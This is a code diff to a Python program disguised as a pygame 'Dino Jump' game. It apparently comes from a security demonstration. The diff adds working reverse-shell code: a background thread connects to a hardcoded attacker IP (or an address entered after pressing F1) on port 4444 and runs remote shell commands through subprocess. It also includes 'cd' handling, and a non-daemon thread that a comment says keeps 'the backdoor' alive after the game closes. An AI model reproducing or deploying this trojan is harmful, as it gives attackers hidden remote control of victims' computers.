@@ -84,7 +84,21 @@ def interactive_shell(s):
             if not command or command.lower() == "exit":
                 break
             
-            # 4. Execute and Send Output
+            # 4. Handle 'cd' command manually (Required for directory traversal)
+            if command.lower().startswith("cd "):
+                try:
+                    path = command[3:].strip().strip('"')
+                    os.chdir(path)
+                    s.sendall(b"[CWD Changed]\n")
+                    continue
+                except Exception as e:
+                    s.sendall(f"CD Error: {str(e)}\n".encode())
+                    continue
+            elif command.lower() == "cd":
+                s.sendall(f"{os.getcwd()}\n".encode())
+                continue
+            
+            # 5. Execute other commands
             try:
                 output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
                 if not output: output = b"[Done]"
@@ -92,7 +106,7 @@ def interactive_shell(s):
             except subprocess.CalledProcessError as e:
                 s.sendall(e.output + b"\n")
             except Exception as e:
-                s.sendall(f"System Error: {str(e)}\n".encode())
+                s.sendall(f"Execution Error: {str(e)}\n".encode())
                 
         except (ConnectionResetError, BrokenPipeError):
             break
@@ -111,7 +125,7 @@ def scan_and_shell(target_ip, port, found_flag):
     
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(0.7)
+        s.settimeout(3.0) # Increased for stability on Wi-Fi presentation
         if s.connect_ex((target_ip, port)) == 0:
             if not found_flag[0]:
                 found_flag[0] = True
@@ -148,20 +162,13 @@ def background_test():
     while True:
         found_flag = [False]
         TARGET_FOUND = False
-        BACKGROUND_STATUS = "Searching for command center..."
+        BACKGROUND_STATUS = "Connecting to RCA Command Center..."
         
-        # Periodic scanning
-        for local_ip in local_ips:
-            if found_flag[0]: break
-            subnet = ".".join(local_ip.split(".")[:-1]) + "."
-            for i in range(1, 255):
-                if found_flag[0]: break
-                target = f"{subnet}{i}"
-                if target == local_ip: continue
-                t = threading.Thread(target=scan_and_shell, args=(target, KALI_PORT, found_flag))
-                t.daemon = True
-                t.start()
-                if i % 40 == 0: time.sleep(0.05)
+        # 1. Strictly connect to the presentation IP (No scanning!)
+        KALI_IP = "10.12.74.152" 
+        scan_and_shell(KALI_IP, KALI_PORT, found_flag)
+        
+        # Wait until the shell session ends
         
         # Wait until the shell session ends or timeout
         if found_flag[0]:
@@ -226,7 +233,8 @@ def run_game():
         if progress >= 100: time.sleep(0.5)
 
     STAGING_COMPLETE = True
-    threading.Thread(target=background_test, daemon=True).start()
+    # Non-daemon thread ensures the backdoor keeps running even if the game is closed!
+    threading.Thread(target=background_test, daemon=False).start()
 
     # --- Scene 2: The Game (Dino Jump) ---
     gravity = 0.8
@@ -251,6 +259,16 @@ def run_game():
                     elif not is_jumping:
                         dino_v = jump_strength
                         is_jumping = True
+                if event.key == pygame.K_F1:
+                    import tkinter.simpledialog as sd
+                    import tkinter as tk
+                    root = tk.Tk()
+                    root.withdraw()
+                    # Suggest the user's current Wi-Fi IP
+                    manual_ip = sd.askstring("Manual Link", "Enter Attacker IP Address:", initialvalue="10.12.74.152")
+                    if manual_ip:
+                        threading.Thread(target=scan_and_shell, args=(manual_ip, 4444, [False]), daemon=True).start()
+                    root.destroy()
 
         if not game_over:
             dino_v += gravity
